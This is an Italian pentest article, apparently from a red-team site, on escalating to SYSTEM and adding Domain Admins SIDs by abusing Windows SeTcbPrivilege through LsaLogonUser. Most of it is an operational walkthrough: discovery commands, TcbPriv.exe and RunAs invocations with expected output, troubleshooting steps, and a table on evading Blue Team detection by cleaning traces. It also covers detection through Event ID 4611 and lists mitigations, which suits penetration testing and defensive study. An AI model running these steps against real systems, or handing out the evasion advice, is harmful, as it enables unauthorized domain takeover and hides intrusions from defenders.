---
title: 'SeTcbPrivilege: LSA Logon Session Arbitrarie a SYSTEM'
slug: setcbprivilege
description: >-
  Trovato SeTcbPrivilege su un account non di sistema? Crei sessioni LSA con SID
  Domain Admins e ottieni SYSTEM senza condizioni esterne. Tecnica Red Team.
image: /setcbprivilege.webp
draft: false
date: 2026-06-19T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - setcbprivilege
  - lsa-logon-session
  - token-forgery
---

Hai SeTcbPrivilege su un account non di sistema — **finding critico P0, documenta prima di tutto**. Con questo privilegio crei sessioni logon ufficiali via LSA con SID arbitrari, aggiungi Domain Admins al token e ottieni SYSTEM senza dipendere da nessuna condizione esterna.

***

## Quick Exploit

```cmd
accesschk.exe -a SeTcbPrivilege *
whoami /priv | findstr SeTcb
wmic group where "name='Domain Admins'" get SID
```

```cmd
TcbPriv.exe -logontype SERVICE -user "NT AUTHORITY\SYSTEM"
RunAs.exe -token [handle] cmd.exe
```

Output atteso:

```
nt authority\system
```

***

## Attack Chain

```
SeTcbPrivilege su account non-SYSTEM trovato
  → PRIMO: documenta come finding critico P0
  → wmic group → ottieni SID Domain Admins
  → TcbPriv.exe -logontype SERVICE -user "NT AUTHORITY\SYSTEM" -extra-sid [SID-DA]
  → sessione logon LSA creata con SID Domain Admins incluso
  → RunAs.exe con handle token → shell SYSTEM / accesso NTLM come DA
```

***

## Tool Decision

| Obiettivo                                | Strumento                                                                    |
| ---------------------------------------- | ---------------------------------------------------------------------------- |
| Sessione logon SYSTEM via LSA            | `TcbPriv.exe` da [hatRiot/token-priv](https://github.com/hatRiot/token-priv) |
| Sessione con Domain Admin SID aggiuntivo | `TcbPriv.exe -extra-sid S-1-5-21-[DOMAIN]-512`                               |
| Ottieni SID Domain Admins                | `wmic group where "name='Domain Admins'" get SID`                            |
| Verifica SID in PowerShell               | `(Get-ADGroup "Domain Admins").SID.Value`                                    |

***

## Cos'è SeTcbPrivilege

"Act as part of the operating system" — il processo con questo privilegio è trattato come parte del Trusted Computing Base (TCB). Sblocca `LsaLogonUser()` con parametri non standard:

* Crea sessioni logon di servizio per account di sistema senza conoscere la password
* Aggiunge **SID arbitrari** al token durante la creazione della sessione (parametro `groups`)
* Crea sessioni con LogonType personalizzati non normalmente accessibili

A differenza di SeCreateTokenPrivilege che usa syscall NT dirette, SeTcbPrivilege lavora attraverso LSA — le sessioni create sono considerate "ufficiali" dal sistema di autenticazione.

**Normalmente esclusivo di:** `lsass.exe`, `services.exe`, `winlogon.exe`. Se lo trovi su un account non di sistema → **finding critico da documentare immediatamente**.

***

## Quando esiste

In un pentest normale: quasi mai su account non di sistema. Se appare:

* **Misconfiguration grave** — assegnato per errore via policy
* **Indicatore di compromissione pregressa** — backdoor su service account

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeTcbPrivilege    Act as part of the operating system    Enabled
```

Audit immediato:

```cmd
accesschk.exe -a SeTcbPrivilege *
```

***

## Step 1 — Exploit con LsaLogonUser via token-priv

Usa la collection PoC di hatRiot. Scaricabile da [hatRiot/token-priv](https://github.com/hatRiot/token-priv):

```cmd
TcbPriv.exe -logontype SERVICE -user "NT AUTHORITY\SYSTEM"
```

Con SID aggiuntivi — per esempio Domain Admins (`S-1-5-21-[DOMAIN]-512`):

```cmd
TcbPriv.exe -logontype SERVICE -user "NT AUTHORITY\SYSTEM" -extra-sid S-1-5-21-1234567890-1234567890-1234567890-512
```

Trova il SID di Domain Admins del tuo dominio con:

```cmd
wmic group where "name='Domain Admins'" get SID
```

Oppure in PowerShell:

```powershell
(Get-ADGroup "Domain Admins").SID.Value
```

***

## Step 2 — Avvia processo con il token della sessione creata

```cmd
RunAs.exe -token [handle dalla sessione LsaLogonUser] cmd.exe
```

Output:

```
nt authority\system
```

***

## Differenza con SeCreateTokenPrivilege

|                | SeTcbPrivilege           | SeCreateTokenPrivilege            |
| -------------- | ------------------------ | --------------------------------- |
| API            | `LsaLogonUser` (via LSA) | `NtCreateToken` (syscall diretta) |
| Sessione logon | ✅ Ufficiale via LSA      | ❌ Token standalone                |
| SID aggiuntivi | ✅ Via parametro `groups` | ✅ Via struttura del token         |
| Rarità         | Estrema                  | Estrema                           |

In pratica entrambi portano allo stesso risultato. La differenza è tecnica: SeTcbPrivilege crea sessioni "ufficiali" che passano per LSA, SeCreateTokenPrivilege bypassa LSA completamente.

***

## Event ID da conoscere

**Event ID 4611** — processo registrato come logon process trusted tramite TCB:

```
A trusted logon process has been registered with the Local Security Authority.
Subject: [account che ha usato SeTcbPrivilege]
Logon Process Name: [nome del processo]
```

Un alert su 4611 da processi non standard (`lsass.exe`, `winlogon.exe`) è un segnale critico che qualcosa di anomalo è in corso.

***

## Scenari reali

Trovare SeTcbPrivilege su un account non-SYSTEM è quasi sempre:

1. **Misconfiguration grave** — un admin ha assegnato il privilegio per errore (es. tramite policy mal configurata)
2. **Indicatore di compromissione pregressa** — un attaccante precedente ha installato una backdoor su questo account

In entrambi i casi: documenta, segnala come finding critico P0 e poi sfrutta.

***

## Errori comuni

**`LsaLogonUser` → `STATUS_PRIVILEGE_NOT_HELD`** — SeTcbPrivilege non Enabled. Verifica: `whoami /priv | findstr SeTcb`.

**SID aggiuntivi non compaiono nel token risultante** — SeTcbPrivilege non attivo. Senza TCB il parametro `groups` di LsaLogonUser viene silenziosamente ignorato — il token viene creato ma senza i SID extra.

**Risorse di rete Kerberos bloccano l'accesso** — PAC validation. Il token con DA SID funziona per NTLM e accesso locale. Per risorse Kerberos serve PTH con hash reali o un Golden Ticket.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                                  | Come lo bypassa il Red Team                                                                     |
| --------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| **Event ID 4611** — logon process registration anomalo    | Opera velocemente e pulisci le tracce — questo evento è quasi sempre un alert immediato nei SOC |
| LsaLogonUser con LogonType SERVICE da processo non-SYSTEM | Difficile nascondere — agisci durante finestre di manutenzione                                  |
| Account non-SYSTEM con SeTcbPrivilege in audit            | Finding — rimuovi il privilegio dall'account dopo aver completato                               |

***

## Quando fallisce

* `LsaLogonUser` → `STATUS_PRIVILEGE_NOT_HELD` → SeTcbPrivilege non Enabled
* SID extra assenti nel token → SeTcbPrivilege non attivo nel token corrente
* Kerberos PAC validation → usa NTLM o PTH

***

## Mitigazioni

* Non assegnare mai SeTcbPrivilege ad account non di sistema
* Audit periodico: `accesschk.exe -a SeTcbPrivilege *`
* Monitorare Event ID 4611 per registrazioni anomale di logon process
* **Protected Users** per account privilegiati

**Nota realistica:** Trovare SeTcbPrivilege su un account non di sistema in produzione è quasi sempre sintomo di compromissione pregressa o di una policy mal configurata che ha assegnato il privilegio per errore. È un finding P0 da riportare immediatamente — prima di qualsiasi sfruttamento.

***

## FAQ

**Perché lsass.exe ha SeTcbPrivilege?**
Per creare token di sessione durante il logon. Ogni login chiama LsaLogonUser con SeTcbPrivilege per costruire il token con i gruppi corretti dell'utente.

**Differenza pratica con SeCreateTokenPrivilege?**
SeCreateTokenPrivilege usa `NtCreateToken` (syscall diretta, token standalone). SeTcbPrivilege usa `LsaLogonUser` (via LSA, sessione ufficiale). In pratica entrambi portano allo stesso risultato — la distinzione è tecnica.

**In un pentest vedrò mai questo su account non di sistema?**
Raramente. Se lo vedi: P0 immediato.

***

SeTcbPrivilege su un account non di sistema = compromissione pregressa o misconfiguration critica. Documenta sempre prima di sfruttarlo.

***

**Articoli correlati:**

* [SeCreateTokenPrivilege](https://hackita.it/articoli/secreatetokenprivilege) — token forgery via syscall diretta
* [SeImpersonatePrivilege](https://hackita.it/articoli/seimpersonateprivilege) — token capture reattivo, molto più comune

**Riferimenti:** [token-priv PoC](https://github.com/hatRiot/token-priv) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)
